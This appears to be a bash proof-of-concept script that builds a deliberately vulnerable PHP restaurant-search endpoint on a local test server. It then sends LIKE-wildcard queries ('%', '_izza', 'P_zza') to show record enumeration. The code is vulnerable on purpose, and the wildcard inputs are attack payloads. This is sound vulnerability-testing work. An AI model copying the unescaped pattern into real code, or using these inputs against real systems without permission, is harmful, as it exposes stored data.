#!/bin/bash

# POC: LIKE Wildcard Injection Information Disclosure (v2)
# Tests unescaped LIKE wildcard characters (% and _) in search queries
# Creates a minimal test database to demonstrate the vulnerability

# Create a test PHP script that reproduces the vulnerable code
TEST_SERVER_PORT=8765
TEST_ENDPOINT="/test_vulnerable_search.php"

# Create test directory
TEST_DIR=$(mktemp -d)
cd "$TEST_DIR"

# Create vulnerable PHP endpoint that simulates search_restaurants.php
cat > test_vulnerable_search.php << 'PHPCODE'
<?php
// Simulate the vulnerable search_restaurants.php endpoint
// This reproduces the exact vulnerable code pattern

// Simulate database with some test data
$restaurants = [
    ['id' => 1, 'name' => 'Pizza Palace', 'category' => 'Italian'],
    ['id' => 2, 'name' => 'Pizza Hut', 'category' => 'Italian'],
    ['id' => 3, 'name' => 'Pizzeria Luigi', 'category' => 'Italian'],
    ['id' => 4, 'name' => 'Pasta Paradise', 'category' => 'Italian'],
    ['id' => 5, 'name' => 'Peter Pan Burger', 'category' => 'American'],
];

header('Content-Type: application/json');

// Get search query from GET parameter
$query = isset($_GET['query']) ? $_GET['query'] : '';

// VULNERABLE CODE (from search_restaurants.php line 9)
// The user input is directly wrapped with LIKE wildcards without escaping _ and % characters
$searchQuery = "%$query%";

// Simulate LIKE matching with the vulnerable pattern
$results = [];
foreach ($restaurants as $restaurant) {
    // This simulates how SQL LIKE matching works with unescaped wildcards
    // Convert LIKE pattern to regex for simulation
    $pattern = str_replace(['%', '_'], ['.*', '.'], preg_quote($searchQuery, '/'));
    $pattern = '/^' . $pattern . '$/i';
    
    // Check if restaurant name or category matches the LIKE pattern
    if (preg_match($pattern, $restaurant['name']) || preg_match($pattern, $restaurant['category'])) {
        $results[] = $restaurant;
    }
}

echo json_encode([
    'success' => true,
    'query' => $query,
    'search_pattern' => $searchQuery,
    'results' => $results,
    'count' => count($results)
]);
?>
PHPCODE

echo "=== LIKE Wildcard Injection POC (v2) ==="
echo "Test Environment: $TEST_DIR"
echo ""

# Start PHP development server in background
echo "[*] Starting test PHP server on port $TEST_SERVER_PORT..."
php -S localhost:$TEST_SERVER_PORT > /dev/null 2>&1 &
SERVER_PID=$!
sleep 2

# Function to cleanup
cleanup() {
    kill $SERVER_PID 2>/dev/null
    cd /
    rm -rf "$TEST_DIR"
}
trap cleanup EXIT

echo "[+] Server started (PID: $SERVER_PID)"
echo ""

# Test 1: Normal search
echo "[*] Test 1: Normal literal search"
echo "Query: 'pizza' (literal string)"
RESPONSE=$(curl -s "http://localhost:$TEST_SERVER_PORT/test_vulnerable_search.php?query=pizza")
echo "Response: $RESPONSE"
RESULT_COUNT=$(echo "$RESPONSE" | grep -o '"count":[0-9]*' | cut -d: -f2)
echo "Matches: $RESULT_COUNT restaurants"
echo ""

# Test 2: Using % wildcard - should match multiple restaurants
echo "[*] Test 2: Using % wildcard (matches any characters)"
echo "Query: 'P%' (pattern: P followed by anything)"
RESPONSE=$(curl -s "http://localhost:$TEST_SERVER_PORT/test_vulnerable_search.php?query=P%")
echo "Response: $RESPONSE"
RESULT_COUNT=$(echo "$RESPONSE" | grep -o '"count":[0-9]*' | cut -d: -f2)
echo "Matches: $RESULT_COUNT restaurants (should match Pizza Palace, Pizza Hut, Pizzeria Luigi, Peter Pan Burger, Pasta Paradise)"
echo ""

# Test 3: Using _ wildcard - single character match
echo "[*] Test 3: Using _ wildcard (matches single character)"
echo "Query: '_izza' (pattern: any single char + 'izza')"
RESPONSE=$(curl -s "http://localhost:$TEST_SERVER_PORT/test_vulnerable_search.php?query=_izza")
echo "Response: $RESPONSE"
RESULT_COUNT=$(echo "$RESPONSE" | grep -o '"count":[0-9]*' | cut -d: -f2)
echo "Matches: $RESULT_COUNT restaurants"
echo ""

# Test 4: Pattern matching - character enumeration
echo "[*] Test 4: Character enumeration via patterns"
echo "Query: 'P_zza' (pattern: P + any single char + 'zza')"
RESPONSE=$(curl -s "http://localhost:$TEST_SERVER_PORT/test_vulnerable_search.php?query=P_zza")
echo "Response: $RESPONSE"
RESULT_COUNT=$(echo "$RESPONSE" | grep -o '"count":[0-9]*' | cut -d: -f2)
echo "Matches: $RESULT_COUNT restaurants"
echo ""

# Test 5: All wildcard - enumerate all
echo "[*] Test 5: Enumerate all restaurants using '%' wildcard"
echo "Query: '%' (matches all restaurants)"
RESPONSE=$(curl -s "http://localhost:$TEST_SERVER_PORT/test_vulnerable_search.php?query=%")
echo "Response: $RESPONSE"
RESULT_COUNT=$(echo "$RESPONSE" | grep -o '"count":[0-9]*' | cut -d: -f2)
echo "Matches: $RESULT_COUNT restaurants (enumeration attack successful)"
echo ""

# Test 6: Complex pattern for data extraction
echo "[*] Test 6: Complex pattern matching for data extraction"
echo "Query: 'Pizza_%' (pattern: Pizza followed by anything)"
RESPONSE=$(curl -s "http://localhost:$TEST_SERVER_PORT/test_vulnerable_search.php?query=Pizza_%")
echo "Response: $RESPONSE"
RESULT_COUNT=$(echo "$RESPONSE" | grep -o '"count":[0-9]*' | cut -d: -f2)
echo "Matches: $RESULT_COUNT restaurants"
echo ""

echo "[+] POC Demonstration Complete"
echo ""
echo "=== VULNERABILITY ANALYSIS ==="
echo "The vulnerable code constructs: \$searchQuery = \"%\$query%\";"
echo ""
echo "This allows attackers to:"
echo "  1. Use % to match any sequence of characters"
echo "  2. Use _ to match any single character"
echo "  3. Combine patterns to enumerate database values"
echo "  4. Extract restaurant names and categories through inference attacks"
echo ""
echo "Attack scenario:"
echo "  - Query 'P%' returns all restaurants starting with 'P'"
echo "  - Query 'P_zza' reveals restaurants with pattern P[x]zza"
echo "  - Query '%' returns all restaurants for complete enumeration"
echo ""
echo "Impact: Information Disclosure - Unauthorized database content extraction"